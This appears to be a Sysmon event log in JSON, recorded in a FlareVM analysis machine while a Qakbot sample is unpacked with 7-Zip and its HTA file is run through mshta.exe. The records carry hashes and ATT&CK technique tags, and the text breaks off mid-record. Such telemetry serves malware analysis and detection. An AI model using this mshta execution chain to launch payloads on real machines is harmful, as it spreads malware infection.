[{"EventSourceName":"Microsoft-Windows-Sysmon","Provider":"Microsoft-Windows-Sysmon","ProviderGuid":"{5770385f-c22a-43e0-bf4c-06f5698ffbd9}","Level":"4","Keywords":"0x8000000000000000","Channel":"Microsoft-Windows-Sysmon/Operational","Computer":"FlareVM","TimeCreated":"2023-03-02T11:37:56.438Z","TimeGenerated":"2023-03-02T04:37:56.438Z","EventRecordID":"57611","EventID":1,"Message":"Process Create:\r\nRuleName: technique_id=T1204,technique_name=User Execution\r\nUtcTime: 2023-03-02 16:37:56.434\r\nProcessGuid: {159466bb-d0e4-6400-4001-000000000f00}\r\nProcessId: 3080\r\nImage: C:\\Program Files\\7-Zip\\7zG.exe\r\nFileVersion: 15.05 beta\r\nDescription: 7-Zip GUI\r\nProduct: 7-Zip\r\nCompany: Igor Pavlov\r\nOriginalFileName: 7zg.exe\r\nCommandLine: \"C:\\Program Files\\7-Zip\\7zG.exe\" x -o\"C:\\Users\\malware\\Desktop\\Malware\\Qakbot\\7427d5bcdd548f6bc47b6f776f1f157e23619be3814d3da7c0f0e234306fb39a\" -spe -slp- -an -ai#7zMap30519:220:7zEvent25372\r\nCurrentDirectory: C:\\Windows\\system32\\\r\nUser: FLAREVM\\malware\r\nLogonGuid: {159466bb-cd20-6400-d5fd-0d0000000000}\r\nLogonId: 0xDFDD5\r\nTerminalSessionId: 1\r\nIntegrityLevel: Medium\r\nHashes: SHA1=2D9DB85DC0F67D477CD84F2F11327DE2560F404D,MD5=88BEE3C09D4FE193AE9B2DB683C8430F,SHA256=870AD39289D10F2FEA84C24AD163E8B5DF325ECA5AD23D09E2491905DE4452AD,IMPHASH=BC6D38BA5546743BF4168778CDBC5960\r\nParentProcessGuid: {159466bb-cd21-6400-9700-000000000f00}\r\nParentProcessId: 6508\r\nParentImage: C:\\Windows\\explorer.exe\r\nParentCommandLine: C:\\Windows\\Explorer.EXE\r\nParentUser: FLAREVM\\malware","EventData":"\u003cEventData xmlns=\"http://schemas.microsoft.com/win/2004/08/events/event\"\u003e\u003cData Name=\"RuleName\"\u003etechnique_id=T1204,technique_name=User Execution\u003c/Data\u003e\u003cData Name=\"UtcTime\"\u003e2023-03-02 16:37:56.434\u003c/Data\u003e\u003cData Name=\"ProcessGuid\"\u003e{159466bb-d0e4-6400-4001-000000000f00}\u003c/Data\u003e\u003cData Name=\"ProcessId\"\u003e3080\u003c/Data\u003e\u003cData Name=\"Image\"\u003eC:\\Program Files\\7-Zip\\7zG.exe\u003c/Data\u003e\u003cData Name=\"FileVersion\"\u003e15.05 beta\u003c/Data\u003e\u003cData Name=\"Description\"\u003e7-Zip GUI\u003c/Data\u003e\u003cData Name=\"Product\"\u003e7-Zip\u003c/Data\u003e\u003cData Name=\"Company\"\u003eIgor Pavlov\u003c/Data\u003e\u003cData Name=\"OriginalFileName\"\u003e7zg.exe\u003c/Data\u003e\u003cData Name=\"CommandLine\"\u003e\"C:\\Program Files\\7-Zip\\7zG.exe\" x -o\"C:\\Users\\malware\\Desktop\\Malware\\Qakbot\\7427d5bcdd548f6bc47b6f776f1f157e23619be3814d3da7c0f0e234306fb39a\" -spe -slp- -an -ai#7zMap30519:220:7zEvent25372\u003c/Data\u003e\u003cData Name=\"CurrentDirectory\"\u003eC:\\Windows\\system32\\\u003c/Data\u003e\u003cData Name=\"User\"\u003eFLAREVM\\malware\u003c/Data\u003e\u003cData Name=\"LogonGuid\"\u003e{159466bb-cd20-6400-d5fd-0d0000000000}\u003c/Data\u003e\u003cData Name=\"LogonId\"\u003e0xdfdd5\u003c/Data\u003e\u003cData Name=\"TerminalSessionId\"\u003e1\u003c/Data\u003e\u003cData Name=\"IntegrityLevel\"\u003eMedium\u003c/Data\u003e\u003cData Name=\"Hashes\"\u003eSHA1=2D9DB85DC0F67D477CD84F2F11327DE2560F404D,MD5=88BEE3C09D4FE193AE9B2DB683C8430F,SHA256=870AD39289D10F2FEA84C24AD163E8B5DF325ECA5AD23D09E2491905DE4452AD,IMPHASH=BC6D38BA5546743BF4168778CDBC5960\u003c/Data\u003e\u003cData Name=\"ParentProcessGuid\"\u003e{159466bb-cd21-6400-9700-000000000f00}\u003c/Data\u003e\u003cData Name=\"ParentProcessId\"\u003e6508\u003c/Data\u003e\u003cData Name=\"ParentImage\"\u003eC:\\Windows\\explorer.exe\u003c/Data\u003e\u003cData Name=\"ParentCommandLine\"\u003eC:\\Windows\\Explorer.EXE\u003c/Data\u003e\u003cData Name=\"ParentUser\"\u003eFLAREVM\\malware\u003c/Data\u003e\u003c/EventData\u003e","Task":1,"RuleName":"technique_id=T1204,technique_name=User Execution","UtcTime":"2023-03-02 16:37:56.434","ProcessGuid":"159466bb-d0e4-6400-4001-000000000f00","ProcessId":3080,"Image":"C:\\Program Files\\7-Zip\\7zG.exe","FileVersion":"15.05 beta","Description":"7-Zip GUI","Product":"7-Zip","Company":"Igor Pavlov","OriginalFileName":"7zg.exe","CommandLine":"\"C:\\Program Files\\7-Zip\\7zG.exe\" x -o\"C:\\Users\\malware\\Desktop\\Malware\\Qakbot\\7427d5bcdd548f6bc47b6f776f1f157e23619be3814d3da7c0f0e234306fb39a\" -spe -slp- -an -ai#7zMap30519:220:7zEvent25372","CurrentDirectory":"C:\\Windows\\system32\\","User":"FLAREVM\\malware","LogonGuid":"159466bb-cd20-6400-d5fd-0d0000000000","LogonId":"0xdfdd5","TerminalSessionId":1,"IntegrityLevel":"Medium","Hashes":"SHA1=2D9DB85DC0F67D477CD84F2F11327DE2560F404D,MD5=88BEE3C09D4FE193AE9B2DB683C8430F,SHA256=870AD39289D10F2FEA84C24AD163E8B5DF325ECA5AD23D09E2491905DE4452AD,IMPHASH=BC6D38BA5546743BF4168778CDBC5960","ParentProcessGuid":"159466bb-cd21-6400-9700-000000000f00","ParentProcessId":6508,"ParentImage":"C:\\Windows\\explorer.exe","ParentCommandLine":"C:\\Windows\\Explorer.EXE","ParentUser":"FLAREVM\\malware"},{"EventSourceName":"Microsoft-Windows-Sysmon","Provider":"Microsoft-Windows-Sysmon","ProviderGuid":"{5770385f-c22a-43e0-bf4c-06f5698ffbd9}","Level":"4","Keywords":"0x8000000000000000","Channel":"Microsoft-Windows-Sysmon/Operational","Computer":"FlareVM","TimeCreated":"2023-03-02T11:37:56.562Z","TimeGenerated":"2023-03-02T04:37:56.562Z","EventRecordID":"57612","EventID":11,"Message":"File created:\r\nRuleName: -\r\nUtcTime: 2023-03-02 16:37:56.554\r\nProcessGuid: {159466bb-d0e4-6400-4001-000000000f00}\r\nProcessId: 3080\r\nImage: C:\\Program Files\\7-Zip\\7zG.exe\r\nTargetFilename: C:\\Users\\malware\\Desktop\\Malware\\Qakbot\\7427d5bcdd548f6bc47b6f776f1f157e23619be3814d3da7c0f0e234306fb39a\r\nCreationUtcTime: 2023-03-02 16:37:56.554\r\nUser: FLAREVM\\malware","EventData":"\u003cEventData xmlns=\"http://schemas.microsoft.com/win/2004/08/events/event\"\u003e\u003cData Name=\"RuleName\"\u003e-\u003c/Data\u003e\u003cData Name=\"UtcTime\"\u003e2023-03-02 16:37:56.554\u003c/Data\u003e\u003cData Name=\"ProcessGuid\"\u003e{159466bb-d0e4-6400-4001-000000000f00}\u003c/Data\u003e\u003cData Name=\"ProcessId\"\u003e3080\u003c/Data\u003e\u003cData Name=\"Image\"\u003eC:\\Program Files\\7-Zip\\7zG.exe\u003c/Data\u003e\u003cData Name=\"TargetFilename\"\u003eC:\\Users\\malware\\Desktop\\Malware\\Qakbot\\7427d5bcdd548f6bc47b6f776f1f157e23619be3814d3da7c0f0e234306fb39a\u003c/Data\u003e\u003cData Name=\"CreationUtcTime\"\u003e2023-03-02 16:37:56.554\u003c/Data\u003e\u003cData Name=\"User\"\u003eFLAREVM\\malware\u003c/Data\u003e\u003c/EventData\u003e","Task":11,"RuleName":"-","UtcTime":"2023-03-02 16:37:56.554","ProcessGuid":"159466bb-d0e4-6400-4001-000000000f00","ProcessId":3080,"Image":"C:\\Program Files\\7-Zip\\7zG.exe","TargetFilename":"C:\\Users\\malware\\Desktop\\Malware\\Qakbot\\7427d5bcdd548f6bc47b6f776f1f157e23619be3814d3da7c0f0e234306fb39a","CreationUtcTime":"2023-03-02 16:37:56.554","User":"FLAREVM\\malware"},{"EventSourceName":"Microsoft-Windows-Sysmon","Provider":"Microsoft-Windows-Sysmon","ProviderGuid":"{5770385f-c22a-43e0-bf4c-06f5698ffbd9}","Level":"4","Keywords":"0x8000000000000000","Channel":"Microsoft-Windows-Sysmon/Operational","Computer":"FlareVM","TimeCreated":"2023-03-02T11:37:56.562Z","TimeGenerated":"2023-03-02T04:37:56.562Z","EventRecordID":"57613","EventID":11,"Message":"File created:\r\nRuleName: -\r\nUtcTime: 2023-03-02 16:37:56.554\r\nProcessGuid: {159466bb-d0e4-6400-4001-000000000f00}\r\nProcessId: 3080\r\nImage: C:\\Program Files\\7-Zip\\7zG.exe\r\nTargetFilename: C:\\Users\\malware\\Desktop\\Malware\\Qakbot\\7427d5bcdd548f6bc47b6f776f1f157e23619be3814d3da7c0f0e234306fb39a\\7427d5bcdd548f6bc47b6f776f1f157e23619be3814d3da7c0f0e234306fb39a.hta\r\nCreationUtcTime: 2023-03-02 16:37:56.554\r\nUser: FLAREVM\\malware","EventData":"\u003cEventData xmlns=\"http://schemas.microsoft.com/win/2004/08/events/event\"\u003e\u003cData Name=\"RuleName\"\u003e-\u003c/Data\u003e\u003cData Name=\"UtcTime\"\u003e2023-03-02 16:37:56.554\u003c/Data\u003e\u003cData Name=\"ProcessGuid\"\u003e{159466bb-d0e4-6400-4001-000000000f00}\u003c/Data\u003e\u003cData Name=\"ProcessId\"\u003e3080\u003c/Data\u003e\u003cData Name=\"Image\"\u003eC:\\Program Files\\7-Zip\\7zG.exe\u003c/Data\u003e\u003cData Name=\"TargetFilename\"\u003eC:\\Users\\malware\\Desktop\\Malware\\Qakbot\\7427d5bcdd548f6bc47b6f776f1f157e23619be3814d3da7c0f0e234306fb39a\\7427d5bcdd548f6bc47b6f776f1f157e23619be3814d3da7c0f0e234306fb39a.hta\u003c/Data\u003e\u003cData Name=\"CreationUtcTime\"\u003e2023-03-02 16:37:56.554\u003c/Data\u003e\u003cData Name=\"User\"\u003eFLAREVM\\malware\u003c/Data\u003e\u003c/EventData\u003e","Task":11,"RuleName":"-","UtcTime":"2023-03-02 16:37:56.554","ProcessGuid":"159466bb-d0e4-6400-4001-000000000f00","ProcessId":3080,"Image":"C:\\Program Files\\7-Zip\\7zG.exe","TargetFilename":"C:\\Users\\malware\\Desktop\\Malware\\Qakbot\\7427d5bcdd548f6bc47b6f776f1f157e23619be3814d3da7c0f0e234306fb39a\\7427d5bcdd548f6bc47b6f776f1f157e23619be3814d3da7c0f0e234306fb39a.hta","CreationUtcTime":"2023-03-02 16:37:56.554","User":"FLAREVM\\malware"},{"EventSourceName":"Microsoft-Windows-Sysmon","Provider":"Microsoft-Windows-Sysmon","ProviderGuid":"{5770385f-c22a-43e0-bf4c-06f5698ffbd9}","Level":"4","Keywords":"0x8000000000000000","Channel":"Microsoft-Windows-Sysmon/Operational","Computer":"FlareVM","TimeCreated":"2023-03-02T11:37:59.974Z","TimeGenerated":"2023-03-02T04:37:59.974Z","EventRecordID":"57614","EventID":13,"Message":"Registry value set:\r\nRuleName: technique_id=T1543,technique_name=Service Creation\r\nEventType: SetValue\r\nUtcTime: 2023-03-02 16:37:59.962\r\nProcessGuid: {159466bb-d0e4-6400-4001-000000000f00}\r\nProcessId: 3080\r\nImage: C:\\Program Files\\7-Zip\\7zG.exe\r\nTargetObject: HKLM\\System\\CurrentControlSet\\Services\\bam\\State\\UserSettings\\S-1-5-21-2199682790-2533951109-4136935257-1001\\\\Device\\HarddiskVolume3\\Program Files\\7-Zip\\7zG.exe\r\nDetails: Binary Data\r\nUser: FLAREVM\\malware","EventData":"\u003cEventData xmlns=\"http://schemas.microsoft.com/win/2004/08/events/event\"\u003e\u003cData Name=\"RuleName\"\u003etechnique_id=T1543,technique_name=Service Creation\u003c/Data\u003e\u003cData Name=\"EventType\"\u003eSetValue\u003c/Data\u003e\u003cData Name=\"UtcTime\"\u003e2023-03-02 16:37:59.962\u003c/Data\u003e\u003cData Name=\"ProcessGuid\"\u003e{159466bb-d0e4-6400-4001-000000000f00}\u003c/Data\u003e\u003cData Name=\"ProcessId\"\u003e3080\u003c/Data\u003e\u003cData Name=\"Image\"\u003eC:\\Program Files\\7-Zip\\7zG.exe\u003c/Data\u003e\u003cData Name=\"TargetObject\"\u003eHKLM\\System\\CurrentControlSet\\Services\\bam\\State\\UserSettings\\S-1-5-21-2199682790-2533951109-4136935257-1001\\\\Device\\HarddiskVolume3\\Program Files\\7-Zip\\7zG.exe\u003c/Data\u003e\u003cData Name=\"Details\"\u003eBinary Data\u003c/Data\u003e\u003cData Name=\"User\"\u003eFLAREVM\\malware\u003c/Data\u003e\u003c/EventData\u003e","Task":13,"RuleName":"technique_id=T1543,technique_name=Service Creation","EventType":"SetValue","UtcTime":"2023-03-02 16:37:59.962","ProcessGuid":"159466bb-d0e4-6400-4001-000000000f00","ProcessId":3080,"Image":"C:\\Program Files\\7-Zip\\7zG.exe","TargetObject":"HKLM\\System\\CurrentControlSet\\Services\\bam\\State\\UserSettings\\S-1-5-21-2199682790-2533951109-4136935257-1001\\\\Device\\HarddiskVolume3\\Program Files\\7-Zip\\7zG.exe","Details":"Binary Data","User":"FLAREVM\\malware"},{"EventSourceName":"Microsoft-Windows-Sysmon","Provider":"Microsoft-Windows-Sysmon","ProviderGuid":"{5770385f-c22a-43e0-bf4c-06f5698ffbd9}","Level":"4","Keywords":"0x8000000000000000","Channel":"Microsoft-Windows-Sysmon/Operational","Computer":"FlareVM","TimeCreated":"2023-03-02T11:37:59.978Z","TimeGenerated":"2023-03-02T04:37:59.978Z","EventRecordID":"57615","EventID":11,"Message":"File created:\r\nRuleName: technique_id=T1574.010,technique_name=Services File Permissions Weakness\r\nUtcTime: 2023-03-02 16:37:59.978\r\nProcessGuid: {159466bb-a9f3-63f7-2800-000000000f00}\r\nProcessId: 1888\r\nImage: C:\\Windows\\system32\\svchost.exe\r\nTargetFilename: C:\\Windows\\Prefetch\\7ZG.EXE-F49B3D46.pf\r\nCreationUtcTime: 2023-01-15 16:15:33.420\r\nUser: NT AUTHORITY\\SYSTEM","EventData":"\u003cEventData xmlns=\"http://schemas.microsoft.com/win/2004/08/events/event\"\u003e\u003cData Name=\"RuleName\"\u003etechnique_id=T1574.010,technique_name=Services File Permissions Weakness\u003c/Data\u003e\u003cData Name=\"UtcTime\"\u003e2023-03-02 16:37:59.978\u003c/Data\u003e\u003cData Name=\"ProcessGuid\"\u003e{159466bb-a9f3-63f7-2800-000000000f00}\u003c/Data\u003e\u003cData Name=\"ProcessId\"\u003e1888\u003c/Data\u003e\u003cData Name=\"Image\"\u003eC:\\Windows\\system32\\svchost.exe\u003c/Data\u003e\u003cData Name=\"TargetFilename\"\u003eC:\\Windows\\Prefetch\\7ZG.EXE-F49B3D46.pf\u003c/Data\u003e\u003cData Name=\"CreationUtcTime\"\u003e2023-01-15 16:15:33.420\u003c/Data\u003e\u003cData Name=\"User\"\u003eNT AUTHORITY\\SYSTEM\u003c/Data\u003e\u003c/EventData\u003e","Task":11,"RuleName":"technique_id=T1574.010,technique_name=Services File Permissions Weakness","UtcTime":"2023-03-02 16:37:59.978","ProcessGuid":"159466bb-a9f3-63f7-2800-000000000f00","ProcessId":1888,"Image":"C:\\Windows\\system32\\svchost.exe","TargetFilename":"C:\\Windows\\Prefetch\\7ZG.EXE-F49B3D46.pf","CreationUtcTime":"2023-01-15 16:15:33.420","User":"NT AUTHORITY\\SYSTEM"},{"EventSourceName":"Microsoft-Windows-Sysmon","Provider":"Microsoft-Windows-Sysmon","ProviderGuid":"{5770385f-c22a-43e0-bf4c-06f5698ffbd9}","Level":"4","Keywords":"0x8000000000000000","Channel":"Microsoft-Windows-Sysmon/Operational","Computer":"FlareVM","TimeCreated":"2023-03-02T11:38:01.539Z","TimeGenerated":"2023-03-02T04:38:01.539Z","EventRecordID":"57616","EventID":11,"Message":"File created:\r\nRuleName: technique_id=T1574.010,technique_name=Services File Permissions Weakness\r\nUtcTime: 2023-03-02 16:38:01.535\r\nProcessGuid: {159466bb-a9f3-63f7-2800-000000000f00}\r\nProcessId: 1888\r\nImage: C:\\Windows\\system32\\svchost.exe\r\nTargetFilename: C:\\Windows\\Prefetch\\DLLHOST.EXE-269F275E.pf\r\nCreationUtcTime: 2023-03-02 16:23:34.920\r\nUser: NT AUTHORITY\\SYSTEM","EventData":"\u003cEventData xmlns=\"http://schemas.microsoft.com/win/2004/08/events/event\"\u003e\u003cData Name=\"RuleName\"\u003etechnique_id=T1574.010,technique_name=Services File Permissions Weakness\u003c/Data\u003e\u003cData Name=\"UtcTime\"\u003e2023-03-02 16:38:01.535\u003c/Data\u003e\u003cData Name=\"ProcessGuid\"\u003e{159466bb-a9f3-63f7-2800-000000000f00}\u003c/Data\u003e\u003cData Name=\"ProcessId\"\u003e1888\u003c/Data\u003e\u003cData Name=\"Image\"\u003eC:\\Windows\\system32\\svchost.exe\u003c/Data\u003e\u003cData Name=\"TargetFilename\"\u003eC:\\Windows\\Prefetch\\DLLHOST.EXE-269F275E.pf\u003c/Data\u003e\u003cData Name=\"CreationUtcTime\"\u003e2023-03-02 16:23:34.920\u003c/Data\u003e\u003cData Name=\"User\"\u003eNT AUTHORITY\\SYSTEM\u003c/Data\u003e\u003c/EventData\u003e","Task":11,"RuleName":"technique_id=T1574.010,technique_name=Services File Permissions Weakness","UtcTime":"2023-03-02 16:38:01.535","ProcessGuid":"159466bb-a9f3-63f7-2800-000000000f00","ProcessId":1888,"Image":"C:\\Windows\\system32\\svchost.exe","TargetFilename":"C:\\Windows\\Prefetch\\DLLHOST.EXE-269F275E.pf","CreationUtcTime":"2023-03-02 16:23:34.920","User":"NT AUTHORITY\\SYSTEM"},{"EventSourceName":"Microsoft-Windows-Sysmon","Provider":"Microsoft-Windows-Sysmon","ProviderGuid":"{5770385f-c22a-43e0-bf4c-06f5698ffbd9}","Level":"4","Keywords":"0x8000000000000000","Channel":"Microsoft-Windows-Sysmon/Operational","Computer":"FlareVM","TimeCreated":"2023-03-02T11:38:06.283Z","TimeGenerated":"2023-03-02T04:38:06.283Z","EventRecordID":"57617","EventID":12,"Message":"Registry object added or deleted:\r\nRuleName: technique_id=T1546.001,technique_name=Change Default File Association\r\nEventType: CreateKey\r\nUtcTime: 2023-03-02 16:38:06.283\r\nProcessGuid: {159466bb-cd21-6400-9700-000000000f00}\r\nProcessId: 6508\r\nImage: C:\\Windows\\Explorer.EXE\r\nTargetObject: HKU\\S-1-5-21-2199682790-2533951109-4136935257-1001\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Explorer\\FileExts\\.hta\r\nUser: FLAREVM\\malware","EventData":"\u003cEventData xmlns=\"http://schemas.microsoft.com/win/2004/08/events/event\"\u003e\u003cData Name=\"RuleName\"\u003etechnique_id=T1546.001,technique_name=Change Default File Association\u003c/Data\u003e\u003cData Name=\"EventType\"\u003eCreateKey\u003c/Data\u003e\u003cData Name=\"UtcTime\"\u003e2023-03-02 16:38:06.283\u003c/Data\u003e\u003cData Name=\"ProcessGuid\"\u003e{159466bb-cd21-6400-9700-000000000f00}\u003c/Data\u003e\u003cData Name=\"ProcessId\"\u003e6508\u003c/Data\u003e\u003cData Name=\"Image\"\u003eC:\\Windows\\Explorer.EXE\u003c/Data\u003e\u003cData Name=\"TargetObject\"\u003eHKU\\S-1-5-21-2199682790-2533951109-4136935257-1001\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Explorer\\FileExts\\.hta\u003c/Data\u003e\u003cData Name=\"User\"\u003eFLAREVM\\malware\u003c/Data\u003e\u003c/EventData\u003e","Task":12,"RuleName":"technique_id=T1546.001,technique_name=Change Default File Association","EventType":"CreateKey","UtcTime":"2023-03-02 16:38:06.283","ProcessGuid":"159466bb-cd21-6400-9700-000000000f00","ProcessId":6508,"Image":"C:\\Windows\\Explorer.EXE","TargetObject":"HKU\\S-1-5-21-2199682790-2533951109-4136935257-1001\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Explorer\\FileExts\\.hta","User":"FLAREVM\\malware"},{"EventSourceName":"Microsoft-Windows-Sysmon","Provider":"Microsoft-Windows-Sysmon","ProviderGuid":"{5770385f-c22a-43e0-bf4c-06f5698ffbd9}","Level":"4","Keywords":"0x8000000000000000","Channel":"Microsoft-Windows-Sysmon/Operational","Computer":"FlareVM","TimeCreated":"2023-03-02T11:38:06.329Z","TimeGenerated":"2023-03-02T04:38:06.329Z","EventRecordID":"57618","EventID":1,"Message":"Process Create:\r\nRuleName: technique_id=T1204,technique_name=User Execution\r\nUtcTime: 2023-03-02 16:38:06.328\r\nProcessGuid: {159466bb-d0ee-6400-4101-000000000f00}\r\nProcessId: 5844\r\nImage: C:\\Windows\\SysWOW64\\mshta.exe\r\nFileVersion: 11.00.19041.1 (WinBuild.160101.0800)\r\nDescription: Microsoft (R) HTML Application host\r\nProduct: Internet Explorer\r\nCompany: Microsoft Corporation\r\nOriginalFileName: MSHTA.EXE\r\nCommandLine: \"C:\\Windows\\SysWOW64\\mshta.exe\" \"C:\\Users\\malware\\Desktop\\Malware\\Qakbot\\7427d5bcdd548f6bc47b6f776f1f157e23619be3814d3da7c0f0e234306fb39a\\7427d5bcdd548f6bc47b6f776f1f157e23619be3814d3da7c0f0e234306fb39a.hta\" {1E460BD7-F1C3-4B2E-88BF-4E770A288AF5}{1E460BD7-F1C3-4B2E-88BF-4E770A288AF5} \r\nCurrentDirectory: C:\\Users\\malware\\Desktop\\Malware\\Qakbot\\7427d5bcdd548f6bc47b6f776f1f157e23619be3814d3da7c0f0e234306fb39a\\\r\nUser: FLAREVM\\malware\r\nLogonGuid: {159466bb-cd20-6400-d5fd-0d0000000000}\r\nLogonId: 0xDFDD5\r\nTerminalSessionId: 1\r\nIntegrityLevel: Medium\r\nHashes: SHA1=089B8363EB686C8D055EC2C4E5899FDD450EF77D,MD5=06B02D5C097C7DB1F109749C45F3F505,SHA256=213AB5658E44F2A111C5E4CFFA043660BC49307EBB1B7EEDD21DBDDCA5DA41AC,IMPHASH=EE4E4A67C3E30B424AA8A1C9C579181F\r\nParentProcessGuid: {159466bb-cd21-6400-9700-000000000f00}\r\nParentProcessId: 6508\r\nParentImage: C:\\Windows\\explorer.exe\r\nParentCommandLine: C:\\Windows\\Explorer.EXE\r\nParentUser: FLAREVM\\malware","EventData":"\u003cEventData xmlns=\"http://schemas.microsoft.com/win/2004/08/events/event\"\u003e\u003cData Name=\"RuleName\"\u003etechnique_id=T1204,technique_name=User Execution\u003c/Data\u003e\u003cData Name=\"UtcTime\"\u003e2023-03-02 16:38:06.328\u003c/Data\u003e\u003cData Name=\"ProcessGuid\"\u003e{159466bb-d0ee-6400-4101-000000000f00}\u003c/Data\u003e\u003cData Name=\"ProcessId\"\u003e5844\u003c/Data\u003e\u003cData Name=\"Image\"\u003eC:\\Windows\\SysWOW64\\mshta.exe\u003c/Data\u003e\u003cData Name=\"FileVersion\"\u003e11.00.19041.1 (WinBuild.160101.0800)\u003c/Data\u003e\u003cData Name=\"Description\"\u003eMicrosoft (R) HTML Application host\u003c/Data\u003e\u003cData Name=\"Product\"\u003eInternet Explorer\u003c/Data\u003e\u003cData Name=\"Company\"\u003eMicrosoft Corporation\u003c/Data\u003e\u003cData Name=\"OriginalFileName\"\u003eMSHTA.EXE\u003c/Data\u003e\u003cData Name=\"CommandLine\"\u003e\"C:\\Windows\\SysWOW64\\mshta.exe\" \"C:\\Users\\malware\\Desktop\\Malware\\Qakbot\\7427d5bcdd548f6bc47b6f776f1f157e23619be3814d3da7c0f0e234306fb39a\\7427d5bcdd548f6bc47b6f776f1f157e23619be3814d3da7c0f0e234306fb39a.hta\" {1E460BD7-F1C3-4B2E-88BF-4E770A288AF5}{1E460BD7-F1C3-4B2E-88BF-4E770A288AF5} \u003c/Data\u003e\u003cData Name=\"CurrentDirectory\"\u003eC:\\Users\\malware\\Desktop\\Malware\\Qakbot\\7427d5bcdd548f6bc47b6f776f1f157e23619be3814d3da7c0f0e234306fb39a\\\u003c/Data\u003e\u003cData Name=\"User\"\u003eFLAREVM\\malware\u003c/Data\u003e\u003cData Name=\"LogonGuid\"\u003e{159466bb-cd20-6400-d5fd-0d0000000000}\u003c/Data\u003e\u003cData Name=\"LogonId\"\u003e0xdfdd5\u003c/Data\u003e\u003cData Name=\"TerminalSessionId\"\u003e1\u003c/Data\u003e\u003cData Name=\"IntegrityLevel\"\u003eMedium\u003c/Data\u003e\u003cData Name=\"Hashes\"\u003eSHA1=089B8363EB686C8D055EC2C4E5899FDD450EF77D,MD5=06B02D5C097C7DB1F109749C45F3F505,SHA256=213AB5658E44F2A111C5E4CFFA043660BC49307EBB1B7EEDD21DBDDCA5DA41AC,IMPHASH=EE4E4A67C3E30B424AA8A1C9C579181F\u003c/Data\u003e\u003cData Name=\"ParentProcessGuid\"\u003e{159466bb-cd21-6400-9700-000000000f00}\u003c/Data\u003e\u003cData Name=\"ParentProcessId\"\u003e6508\u003c/Data\u003e\u003cData Name=\"ParentImage\"\u003eC:\\Windows\\explorer.exe\u003c/Data\u003e\u003cData Name=\"ParentCommandLine\"\u003eC:\\Windows\\Explorer.EXE\u003c/Data\u003e\u003cData Name=\"ParentUser\"\u003eFLAREVM\\malware\u003c/Data\u003e\u003c/EventData\u003e","Task":1,"RuleName":"technique_id=T1204,technique_name=User Execution","UtcTime":"2023-03-02 16:38:06.328","ProcessGuid":"159466bb-d0ee-6400-4101-000000000f00","ProcessId":5844,"Image":"C:\\Windows\\SysWOW64\\mshta.exe","FileVersion":"11.00.19041.1 (WinBuild.160101.0800)","Description":"Microsoft (R) HTML Application host","Product":"Internet Explorer","Company":"Microsoft Corporation","OriginalFileName":"MSHTA.EXE","CommandLine":"\"C:\\Windows\\SysWOW64\\mshta.exe\" \"C:\\Users\\malware\\Desktop\\Malware\\Qakbot\\7427d5bcdd548f6bc47b6f776f1f157e23619be3814d3da7c0f0e234306fb39a\\7427d5bcdd548f6bc47b6f776f1f157e23619be3814d3da7c0f0e234306fb39a.hta\" {1E460BD7-F1C3-4B2E-88BF-4E770A288AF5}{1E460BD7-F1C3-4B2E-88BF-4E770A288AF5} ","CurrentDirectory":"C:\\Users\\malware\\Desktop\\Malware\\Qakbot\\7427d5bcdd548f6bc47b6f776f1f157e23619be3814d3da7c0f0e234306fb39a\\","User":"FLAREVM\\malware","LogonGuid":"159466bb-cd20-6400-d5fd-0d0000000000","LogonId":"0xdfdd5","TerminalSessionId":1,"IntegrityLevel":"Medium","Hashes":"SHA1=089B8363EB686C8D055EC2C4E5899FDD450EF77D,MD5=06B02D5C097C7DB1F109749C45F3F505,SHA256=213AB5658E44F2A111C5E4CFFA043660BC49307EBB1B7EEDD21DBDDCA5DA41AC,IMPHASH=EE4E4A67C3E30B424AA8A1C9C579181F","ParentProcessGuid":"159466bb-cd21-6400-9700-000000000f00","ParentProcessId":6508,"ParentImage":"C:\\Windows\\explorer.exe","ParentCommandLine":"C:\\Windows\\Explorer.EXE","ParentUser":"FLAREVM\\malware"},{"EventSourceName":"Microsoft-Windows-Sysmon","Provider":"Microsoft-Windows-Sysmon","ProviderGuid":"{5770385f-c22a-43e0-bf4c-06f5698ffbd9}","Level":"4","Keywords":"0x8000000000000000","Channel":"Microsoft-Windows-Sysmon/Operational","Computer":"FlareVM","TimeCreated":"2023-03-02T11:38:06.533Z","TimeGenerated":"2023-03-02T04:38:06.533Z","EventRecordID":"57619","EventID":7,"Message":"Image loaded:\r\nRuleName: -\r\nUtcTime: 2023-03-02 16:38:06.453\r\nProcessGuid: {159466bb-d0ee-6400-4101-000000000f00}\r\nProcessId: 5844\r\nImage: C:\\Windows\\SysWOW64\\mshta.exe\r\nImageLoaded: C:\\Windows\\SysWOW64\\urlmon.dll\r\nFileVersion: 11.00.19041.2251 (WinBuild.160101.0800)\r\nDescription: OLE32 Extensions for Win32\r\nProduct: Internet Explorer\r\nCompany: Microsoft Corporation\r\nOriginalFileName: UrlMon.dll\r\nHashes: SHA1=6D36F794B64D2B8523D6D553C387AA4BDEDA0C11,MD5=69593045E14F379979E0FC24EBE4FCB9,SHA256=3935AB7776A9315D41E64B75E522D7CAA56EDE8E3E89C428505B0D42D8513599,IMPHASH=38D69F1211D9CF420A0045569518C0E0\r\nSigned: true\r\nSignature: Microsoft Windows\r\nSignatureStatus: Valid\r\nUser: FLAREVM\\malware","EventData":"\u003cEventData xmlns=\"http://schemas.microsoft.com/win/2004/08/events/event\"\u003e\u003cData Name=\"RuleName\"\u003e-\u003c/Data\u003e\u003cData Name=\"UtcTime\"\u003e2023-03-02 16:38:06.453\u003c/Data\u003e\u003cData Name=\"ProcessGuid\"\u003e{159466bb-d0ee-6400-4101-000000000f00}\u003c/Data\u003e\u003cData Name=\"ProcessId\"\u003e5844\u003c/Data\u003e\u003cData Name=\"Image\"\u003eC:\\Windows\\SysWOW64\\mshta.exe\u003c/Data\u003e\u003cData Name=\"ImageLoaded\"\u003eC:\\Windows\\SysWOW64\\urlmon.dll\u003c/Data\u003e\u003cData Name=\"FileVersion\"\u003e11.00.19041.2251 (WinBuild.160101.0800)\u003c/Data\u003e\u003cData Name=\"Description\"\u003eOLE32 Extensions for Win32\u003c/Data\u003e\u003cData Name=\"Product\"\u003eInternet Explorer\u003c/Data\u003e\u003cData Name=\"Company\"\u003eMicrosoft Corporation\u003c/Data\u003e\u003cData Name=\"OriginalFileName\"\u003eUrlMon.dll\u003c/Data\u003e\u003cData 